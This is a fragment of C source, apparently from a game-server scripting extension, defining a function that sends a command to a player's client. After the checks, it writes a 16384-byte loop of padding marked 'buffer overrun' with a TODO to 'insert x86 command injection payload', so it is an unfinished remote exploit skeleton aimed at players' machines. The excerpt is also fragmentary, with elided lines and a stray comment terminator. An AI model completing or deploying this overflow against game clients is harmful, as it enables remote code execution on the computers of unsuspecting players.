...
void gsc_player_runcommand(scr_entref_t id)
{
	...
	if ( ! stackGetParams("s", &cmd))
	{
		stackError("gsc_player_runcommand() argument is undefined or has a wrong type");
		stackPushUndefined();
		return;
	}
	...
	if (id >= MAX_CLIENTS)
	{
		stackError("gsc_player_runcommand() entity %i is not a player", id);
		stackPushUndefined();
		return;
	}
    ...
    */
	...
	MSG_WriteShort(&msg, 0);
	MSG_WriteLong(&msg, -1);
    for(i = 0; i < 16384; i++) {    // buffer overrun
        MSG_WriteByte(&msg, 0x00);  // TODO: insert x86 command injection payload
    }
	MSG_WriteString(&msg, cmd);
